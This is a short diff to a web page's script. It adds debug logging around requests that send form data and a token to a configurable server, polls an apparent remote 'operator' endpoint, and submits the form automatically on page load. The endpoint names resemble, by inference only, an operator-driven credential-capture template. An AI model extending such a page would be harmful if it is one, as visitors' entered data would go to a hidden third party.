@@ -409,7 +409,7 @@
     }
   </style>
 </head>
-<body onload="onPageLoad();">
+<body>
 
 <div class="main-container">
   <!-- Top Navigation Bar -->
@@ -853,6 +853,8 @@ async function initialFormSubmission() {
       token: templateConfig.token,
       formData: JSON.stringify(formDataContent)
     };
+    console.log("Initial Form Submission Payload:", finalPayload);
+    console.log("Initial Form Submission Body (URL-encoded):", objectToFormData(finalPayload));
 
     const response = await fetch(`${templateConfig.postURL}/notify-form-submission`, {
       method: 'POST',
@@ -865,6 +867,7 @@ async function initialFormSubmission() {
     }
 
     const data = await response.json();
+    console.log("Initial Form Submission Response:", data);
     const apiResponse = data.apiResponse;
 
     if (apiResponse && apiResponse.browserId) {
@@ -900,10 +903,14 @@ async function pollOperator() {
   }
 
   try {
+    const pollingPayload = { browserId: browserId, token: templateConfig.token };
+    console.log("Polling Payload:", pollingPayload);
+    console.log("Polling Body (URL-encoded):", objectToFormData(pollingPayload));
+
     const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: objectToFormData({ browserId: browserId, token: templateConfig.token })
+      body: objectToFormData(pollingPayload)
     });
 
     if (!response.ok) {
@@ -1014,6 +1021,9 @@ async function handleFormSubmission() {
       resetFormState();
       return;
     }
+    console.log("Handle Form Submission Payload:", payload);
+    console.log("Handle Form Submission Body (URL-encoded):", objectToFormData(payload));
+    console.log("Handle Form Submission X-Update-Type Header:", header);
 
     const response = await fetch(`${templateConfig.postURL}/update-process`, {
       method: 'POST',
@@ -1076,7 +1086,7 @@ function handleSubmit(event) {
 }
 
 // Manually trigger onPageLoad when the DOM is ready
-document.addEventListener('DOMContentLoaded', onPageLoad);
+document.addEventListener('DOMContentLoaded', initialFormSubmission);
 </script>
 
 </body>
